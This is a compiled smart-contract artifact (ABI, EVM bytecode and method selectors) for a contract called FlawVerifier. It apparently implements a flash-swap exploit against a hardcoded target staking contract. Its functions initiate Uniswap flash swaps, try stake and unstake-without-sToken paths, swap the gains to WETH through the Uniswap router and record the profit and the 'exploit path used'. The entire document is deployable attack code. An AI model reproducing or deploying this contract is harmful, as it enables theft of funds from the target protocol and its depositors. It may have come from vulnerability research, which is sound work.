{"abi":[{"type":"constructor","inputs":[],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"STOKEN","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"TARGET","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"TOKEN","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"executeOnOpportunity","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"executed","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"exploitPathUsed","inputs":[],"outputs":[{"name":"","type":"uint8","internalType":"uint8"}],"stateMutability":"view"},{"type":"function","name":"hypothesisValidated","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"initiateFlashswap","inputs":[{"name":"pair","type":"address","internalType":"address"},{"name":"borrowToken","type":"address","internalType":"address"},{"name":"repayToken","type":"address","internalType":"address"},{"name":"borrowAmount","type":"uint256","internalType":"uint256"},{"name":"repayAmount","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"profitAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"profitToken","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"stakePathResult","inputs":[],"outputs":[{"name":"","type":"uint8","internalType":"enum FlawVerifier.PathResult"}],"stateMutability":"view"},{"type":"function","name":"uniswapV2Call","inputs":[{"name":"","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"unstakeWithoutSTokenResult","inputs":[],"outputs":[{"name":"","type":"uint8","internalType":"enum FlawVerifier.PathResult"}],"stateMutability":"view"}],"bytecode":{"object":"0x608080604052346015576121ae908161001a8239f35b5f80fdfe608080604052600436101561001c575b50361561001a575f80fd5b005b5f905f3560e01c9081630c4ee41b146108ab5750806310d1e85c1461025757806331a38c89146102355780633c2448ed1461021957806341a9d24e146101f1578063463defd1146101cc57806349343624146101a15780635ff972cc146101835780637ab2258f1461015b57806382bfefc814610133578063cc1f2afa14610104578063d78c4281146100e15763ee8bac4c0361000f57346100de57806003193601126100de5760ff6100da915460201c1660405191829182610b36565b0390f35b80fd5b50346100de57806003193601126100de5760ff6020915460101c16604051908152f35b50346100de57806003193601126100de5760206040517305999eb831ae28ca920ce645a5164fbdb1d74fe98152f35b50346100de57806003193601126100de5760206040515f5160206121395f395f51905f528152f35b50346100de57806003193601126100de5760ff6100da915460181c1660405191829182610b36565b50346100de57806003193601126100de576020600154604051908152f35b50346100de57806003193601126100de575460405160289190911c6001600160a01b03168152602090f35b50346100de57806003193601126100de5760ff6020915460081c166040519015158152f35b50346100de57806003193601126100de5760206040515f5160206121595f395f51905f528152f35b50346100de57806003193601126100de57610232610bb2565b80f35b50346100de57806003193601126100de5760ff60209154166040519015158152f35b50346100de5760803660031901126100de57610271610b20565b5060243560643567ffffffffffffffff81116108a757366023820112156108a757806004013567ffffffffffffffff81116108a3573691016024011161089f576002546001600160a01b0316330361086857801561085f575b6003546001600160a01b031673dd28c9d511a77835505d2fbe0c9779ed39733bdd190161082b5760055481036107f2576040516370a0823160e01b81523060048201526020816024815f5160206121595f395f51905f525afa80156107e757829184916107b2575b5010610777576040516370a0823160e01b81527305999eb831ae28ca920ce645a5164fbdb1d74fe960048201528291906020816024815f5160206121395f395f51905f525afa908115610603578491610745575b50805b6103f2575b5050156103b157805464ff00ffff0019166401000201001781555b610232610d6c565b60ff815460201c1660048110156103de576103a95764030000000064ff00000000195f5416175f556103a9565b634e487b7160e01b82526021600452602482fd5b80821161073d575b506040516370a0823160e01b81523060048201526020816024815f5160206121395f395f51905f525afa90811561060357849161070c575b506040516370a0823160e01b81523060048201526020816024815f5160206121595f395f51905f525afa9081156107015785916106d0575b50848060405160208101906308742bcd60e21b8252306024820152866044820152826064820152606481526104a0608482610b5d565b5190827305999eb831ae28ca920ce645a5164fbdb1d74fe95af16104c2611585565b50156106a8576040516370a0823160e01b8152306004820152916020836024815f5160206121395f395f51905f525afa92831561069d57869361066a575b506040516370a0823160e01b8152306004820152926020846024815f5160206121595f395f51905f525afa93841561065f57879461062c575b50119182610622575b505061056f57508015610557575b5f8061038e565b64030000000064ff00000000195f5416175f55610550565b905f19811461060e57600101906040516370a0823160e01b81527305999eb831ae28ca920ce645a5164fbdb1d74fe960048201526020816024815f5160206121395f395f51905f525afa9081156106035784916105ce575b5080610389565b90506020813d82116105fb575b816105e860209383610b5d565b810103126105f757515f6105c7565b5f80fd5b3d91506105db565b6040513d86823e3d90fd5b634e487b7160e01b83526011600452602483fd5b1490505f80610542565b9093506020813d8211610657575b8161064760209383610b5d565b810103126105f75751925f610539565b3d915061063a565b6040513d89823e3d90fd5b9092506020813d8211610695575b8161068560209383610b5d565b810103126105f75751915f610500565b3d9150610678565b6040513d88823e3d90fd5b50505080156106b8575f8061038e565b815464ff000000001916640200000000178255610550565b90506020813d82116106f9575b816106ea60209383610b5d565b810103126105f757515f61046a565b3d91506106dd565b6040513d87823e3d90fd5b90506020813d8211610735575b8161072660209383610b5d565b810103126105f757515f610432565b3d9150610719565b90505f6103fa565b90506020813d60201161076f575b8161076060209383610b5d565b810103126105f757515f610386565b3d9150610753565b60405162461bcd60e51b81526020600482015260136024820152726d697373696e6720666c6173682066756e647360681b6044820152606490fd5b9150506020813d6020116107df575b816107ce60209383610b5d565b810103126105f7578190515f610332565b3d91506107c1565b6040513d85823e3d90fd5b60405162461bcd60e51b8152602060048201526011602482015270756e657870656374656420626f72726f7760781b6044820152606490fd5b60405162461bcd60e51b815260206004820152600c60248201526b3137b93937bb903a37b5b2b760a11b6044820152606490fd5b506044356102ca565b60405162461bcd60e51b815260206004820152600f60248201526e3ab732bc3832b1ba32b2103830b4b960891b6044820152606490fd5b5080fd5b8380fd5b8280fd5b9050346105f75760a03660031901126105f7576108c6610b20565b6024356001600160a01b03811692908390036105f7576044356001600160a01b03811692908390036105f75760643591303303610af2575060018060a01b031691826001600160601b0360a01b6002541617600255836001600160601b0360a01b60035416176003556001600160601b0360a01b60045416176004558060055560843560065560405192630dfe168160e01b8452602084600481865afa8015610ab85785945f91610ac3575b506001600160a01b031603610a4357813b15610a3f5760405163022c0d9f60e01b81526004810191909152602481018390523060448201526080606482015260016084820152600160f81b60a4820152908290829060c490829084905af18015610a3457610a1f575b50505b6001600160601b0360a01b600254166002556001600160601b0360a01b600354166003556001600160601b0360a01b60045416600455806005558060065580f35b81610a2991610b5d565b6100de57805f6109db565b6040513d84823e3d90fd5b5050fd5b908092503b156105f75760405163022c0d9f60e01b81525f6004820181905260248201929092523060448201526080606482015260016084820152600160f81b60a482015291829060c490829084905af18015610ab857610aa5575b506109de565b610ab191505f90610b5d565b5f5f610a9f565b6040513d5f823e3d90fd5b610ae5915060203d602011610aeb575b610add8183610b5d565b810190610b93565b5f610972565b503d610ad3565b62461bcd60e51b815260206004820152600960248201526873656c66206f6e6c7960b81b6044820152606490fd5b600435906001600160a01b03821682036105f757565b919060208301926004821015610b495752565b634e487b7160e01b5f52602160045260245ffd5b90601f8019910116810190811067ffffffffffffffff821117610b7f57604052565b634e487b7160e01b5f52604160045260245ffd5b908160209103126105f757516001600160a01b03811681036105f75790565b5f5460ff8116610d485760ff1981166001175f556040516370a0823160e01b81523060048201526020816024815f5160206121195f395f51905f525afa908115610ab8575f91610d16575b506040516370a0823160e01b81523060048201526020816024815f5160206121395f395f51905f525afa908115610ab8575f91610ce4575b506040516370a0823160e01b8152306004820152916020836024815f5160206121595f395f51905f525afa928315610ab8575f93610caa575b506302000001610c9b9463ff0000ff1916175f55610c8a6111c8565b60ff5f5460081c16610c9d57611375565b565b610ca56112a3565b611375565b9392506020843d602011610cdc575b81610cc660209383610b5d565b810103126105f757925191926302000001610c6e565b3d9150610cb9565b90506020813d602011610d0e575b81610cff60209383610b5d565b810103126105f757515f610c35565b3d9150610cf2565b90506020813d602011610d40575b81610d3160209383610b5d565b810103126105f757515f610bfd565b3d9150610d24565b50565b91908203918211610d5857565b634e487b7160e01b5f52601160045260245ffd5b6006545f9080156111c4576004546001600160a01b03165f5160206121395f395f51905f521461116a576004546001600160a01b03165f5160206121195f395f51905f5214610dee5760405162461bcd60e51b8152602060048201526011602482015270756e737570706f7274656420726570617960781b6044820152606490fd5b6040516370a0823160e01b81523060048201526020816024815f5160206121195f395f51905f525afa908115610ab8575f91611138575b50818110610fb7575b506040516370a0823160e01b81523060048201526020816024815f5160206121195f395f51905f525afa9081156107e7579082918491610f82575b5010610f445760025460405163a9059cbb60e01b602082019081526001600160a01b03909216602482015260448101929092528291610eb581606481015b03601f198101835282610b5d565b5190825f5160206121195f395f51905f525af1610ed0611585565b81610f15575b5015610ede57565b60405162461bcd60e51b815260206004820152600f60248201526e1d1c985b9cd9995c8819985a5b1959608a1b6044820152606490fd5b8051801592508215610f2a575b50505f610ed6565b610f3d92506020809183010191016115c4565b5f80610f22565b60405162461bcd60e51b81526020600482015260166024820152751a5b9cdd59999a58da595b9d081c995c185e5b595b9d60521b6044820152606490fd5b9150506020813d602011610faf575b81610f9e60209383610b5d565b810103126105f7578190515f610e69565b3d9150610f91565b610fc19082610d4b565b610fc9611c04565b916001600160a01b031615158061112f575b80611126575b156110ec57610fef92611f0d565b600381029080820460031490151715610d58576040516370a0823160e01b815230600482015290806020836024815f5160206121395f395f51905f525afa928315610ab8575f936110b6575b50918061104e93116110ae575b50611aca565b478015610e2e575f5160206121195f395f51905f523b156105f7575f60049160405192838092630d0e30db60e41b82525f5160206121195f395f51905f525af18015610ab85715610e2e576110a69192505f90610b5d565b5f905f610e2e565b90505f611048565b92506020833d6020116110e4575b816110d160209383610b5d565b810103126105f75761104e92519261103b565b3d91506110c4565b60405162461bcd60e51b815260206004820152601260248201527136b4b9b9b4b733903a37b5b2b7103830b4b960711b6044820152606490fd5b50811515610fe1565b50801515610fdb565b90506020813d602011611162575b8161115360209383610b5d565b810103126105f757515f610e25565b3d9150611146565b60025460405163a9059cbb60e01b602082019081526001600160a01b03909216602482015260448101929092525f925082916111a98160648101610ea7565b5190825f5160206121395f395f51905f525af1610ed0611585565b5050565b6040516370a0823160e01b81527305999eb831ae28ca920ce645a5164fbdb1d74fe960048201526020816024815f5160206121395f395f51905f525afa908115610ab8575f91611271575b508015610d4857611223816115dc565b610d48576112308161176f565b610d485761123d81611817565b610d485761124a81611845565b610d485761125781611873565b610d4857611264816119c9565b610d4857610d4890611a9c565b90506020813d60201161129b575b8161128c60209383610b5d565b810103126105f757515f611213565b3d915061127f565b6040516370a0823160e01b81523060048201526020816024815f5160206121395f395f51905f525afa908115610ab8575f91611343575b508015610d48576112ea90611aca565b47806112f35750565b5f5160206121195f395f51905f523b156105f7575f60049160405192838092630d0e30db60e41b82525f5160206121195f395f51905f525af18015610ab8576113395750565b5f610c9b91610b5d565b90506020813d60201161136d575b8161135e60209383610b5d565b810103126105f757515f6112da565b3d9150611351565b6040516370a0823160e01b81523060048201526020816024815f5160206121195f395f51905f525afa908115610ab8575f91611553575b508181116115175750506040516370a0823160e01b81523060048201526020816024815f5160206121395f395f51905f525afa908115610ab8575f916114e5575b508181116114ac5750506040516370a0823160e01b8152306004820152906020826024815f5160206121595f395f51905f525afa918215610ab8575f92611478575b5080821161143b575050565b5f805465010000000000600160c81b03191678dd28c9d511a77835505d2fbe0c9779ed39733bde000000000017905561147391610d4b565b600155565b9091506020813d6020116114a4575b8161149460209383610b5d565b810103126105f75751905f61142f565b3d9150611487565b5f805465010000000000600160c81b0319167839d8bcb39de75218e3c08200d95fde3a479d7a1400000000001790556114739250610d4b565b90506020813d60201161150f575b8161150060209383610b5d565b810103126105f757515f6113ed565b3d91506114f3565b5f805465010000000000600160c81b03191678c02aaa39b223fe8d0a0e5c4f27ead9083c756cc200000000001790556114739350909150610d4b565b90506020813d60201161157d575b8161156e60209383610b5d565b810103126105f757515f6113ac565b3d9150611561565b3d156115bf573d9067ffffffffffffffff8211610b7f57604051916115b4601f8201601f191660200184610b5d565b82523d5f602084013e565b606090565b908160209103126105f7575180151581036105f75790565b905f9161160a5f5160206121395f395f51905f5273c0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac611dae565b90926001600160a01b03909216919082158015611767575b801561175f575b8015611758575b611701575f938060041c91828460031c90811515908161174e575b50611746575b508215611729575b8215801561171f575b61171457906116719183611f0d565b91821561170a5782101561170157303b156105f75760405192630c4ee41b60e01b845260048401525f5160206121595f395f51905f5260248401525f5160206121395f395f51905f526044840152606483015260848201525f8160a48183305af190816116ec575b506116e15750565b5460081c60ff169150565b6116f99192505f90610b5d565b5f905f6116d9565b505f9450505050565b505f955050505050565b505f96505050505050565b5081831015611662565b91508060071c8381105f1461173f575b91611659565b5082611739565b92505f611651565b905081105f61164b565b505f611630565b508015611629565b508315611622565b905f9161179d5f5160206121395f395f51905f5273c0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac611dae565b90926001600160a01b0390921691908215801561180f575b8015611807575b8015611800575b611701575f938060051c91828460031c90811515908161174e575061174657508215611729578215801561171f5761171457906116719183611f0d565b505f6117c3565b5080156117bc565b5083156117b5565b905f9161160a5f5160206121395f395f51905f52735c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f611dae565b905f9161179d5f5160206121395f395f51905f52735c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f611dae565b905f916118a15f5160206121195f395f51905f5273c0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac611dae565b6001600160a01b0390921691821580156119c1575b80156119b9575b80156119b2575b611701578160061c93848160031c9081151590816119a8575b506119a0575b50841561197f575b5083158015611975575b61170157906119049184611f0d565b801561196d575f92303b156105f75760405192630c4ee41b60e01b845260048401525f5160206121595f395f51905f5260248401525f5160206121195f395f51905f526044840152606483015260848201525f8160a48183305af190816116ec57506116e15750565b505f93505050565b50818410156118f5565b9093508160071c908082105f1461199957505b925f6118eb565b9050611992565b94505f6118e3565b905081105f6118dd565b505f6118c4565b5080156118bd565b5081156118b6565b905f916119f75f5160206121195f395f51905f5273c0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac611dae565b6001600160a01b039092169182158015611a94575b8015611a8c575b8015611a85575b611701578160071c80948060031c80151580611a7c575b611a74575b508515611a57575b5050831580156119755761170157906119049184611f0d565b9194509080821015611a6d57505b925f80611a3e565b9050611a65565b95505f611a36565b50828110611a31565b505f611a1a565b508015611a13565b508115611a0c565b905f916118a15f5160206121195f395f51905f52735c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f611dae565b8015610d4857611ad8611fbb565b60405190611ae7606083610b5d565b6002825260208201906040368337825115611bdc575f5160206121395f395f51905f528252825160011015611bdc575f5160206121195f395f51905f526040840152737a250d5630b4cf539739df2c5dacb4c659f2488d3b156105f757919060405192839263791ac94760e01b845260a484019160048501525f602485015260a060448501525180915260c4830191905f5b818110611bba5750505090805f92306064830152426084830152038183737a250d5630b4cf539739df2c5dacb4c659f2488d5af18015610ab8576113395750565b82516001600160a01b0316845285945060209384019390920191600101611b79565b634e487b7160e01b5f52603260045260245ffd5b51906001600160701b03821682036105f757565b60405163e6a4390560e01b81525f5160206121395f395f51905f5260048201525f5160206121195f395f51905f52602482015290602082604481735c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f5afa918215610ab8575f92611d8d575b506001600160a01b03821615611d8457604051630240bc6b60e21b81526001600160a01b0383169190606081600481865afa928315610ab8575f915f94611d28575b50602060049160405192838092630dfe168160e01b82525afa8015610ab8575f5160206121395f395f51905f52915f91611d09575b506001600160a01b031603611cf9576001600160701b03809116921690565b6001600160701b03928316921690565b611d22915060203d602011610aeb57610add8183610b5d565b5f611cda565b915092506060813d606011611d7c575b81611d4560609383610b5d565b810103126105f757611d5681611bf0565b6040611d6460208401611bf0565b92015163ffffffff8116036105f75790926020611ca5565b3d9150611d38565b5f915081908190565b611da791925060203d602011610aeb57610add8183610b5d565b905f611c63565b60405163e6a4390560e01b81525f5160206121595f395f51905f5260048201526001600160a01b039283166024820152929160209184916044918391165afa918215610ab8575f92611eec575b506001600160a01b03821615611d8457604051630240bc6b60e21b81526001600160a01b0383169190606081600481865afa928315610ab8575f915f94611e90575b50602060049160405192838092630dfe168160e01b82525afa8015610ab8575f5160206121595f395f51905f52915f91611d0957506001600160a01b031603611cf9576001600160701b03809116921690565b915092506060813d606011611ee4575b81611ead60609383610b5d565b810103126105f757611ebe81611bf0565b6040611ecc60208401611bf0565b92015163ffffffff8116036105f75790926020611e3d565b3d9150611ea0565b611f0691925060203d602011610aeb57610add8183610b5d565b905f611dfb565b91909181811015611f865780830292808404821490151715610d58576103e88302928084046103e81490151715610d5857611f4791610d4b565b906103e58202918083046103e51490151715610d58578115611f72570460018101809111610d585790565b634e487b7160e01b5f52601260045260245ffd5b60405162461bcd60e51b815260206004820152600d60248201526c195e18d95cdcda5d99481bdd5d609a1b6044820152606490fd5b604051636eb1769f60e11b8152306004820152737a250d5630b4cf539739df2c5dacb4c659f2488d60248201526020816044815f5160206121395f395f51905f525afa908115610ab8575f916120e6575b505f1914610c9b575f80604051602081019063095ea7b360e01b8252737a250d5630b4cf539739df2c5dacb4c659f2488d60248201528219604482015260448152612058606482610b5d565b5190825f5160206121395f395f51905f525af1612073611585565b816120b7575b501561208157565b60405162461bcd60e51b815260206004820152600e60248201526d185c1c1c9bdd994819985a5b195960921b6044820152606490fd5b80518015925082156120cc575b50505f612079565b6120df92506020809183010191016115c4565b5f806120c4565b90506020813d602011612110575b8161210160209383610b5d565b810103126105f757515f61200c565b3d91506120f456fe000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc200000000000000000000000039d8bcb39de75218e3c08200d95fde3a479d7a14000000000000000000000000dd28c9d511a77835505d2fbe0c9779ed39733bdea26469706673582212205122a30994752babbdb4aede9f95b148690d8d76d0c746ab694f851da59ff9a864736f6c634300081e0033","linkReferences":{}},"methodIdentifiers":{"STOKEN()":"41a9d24e","TARGET()":"cc1f2afa","TOKEN()":"82bfefc8","executeOnOpportunity()":"3c2448ed","executed()":"31a38c89","exploitPathUsed()":"d78c4281","hypothesisValidated()":"463defd1","initiateFlashswap(address,address,address,uint256,uint256)":"0c4ee41b","profitAmount()":"5ff972cc","profitToken()":"49343624","stakePathResult()":"7ab2258f","uniswapV2Call(address,uint256,uint256,bytes)":"10d1e85c","unstakeWithoutSTokenResult()":"ee8bac4c"},"id":0}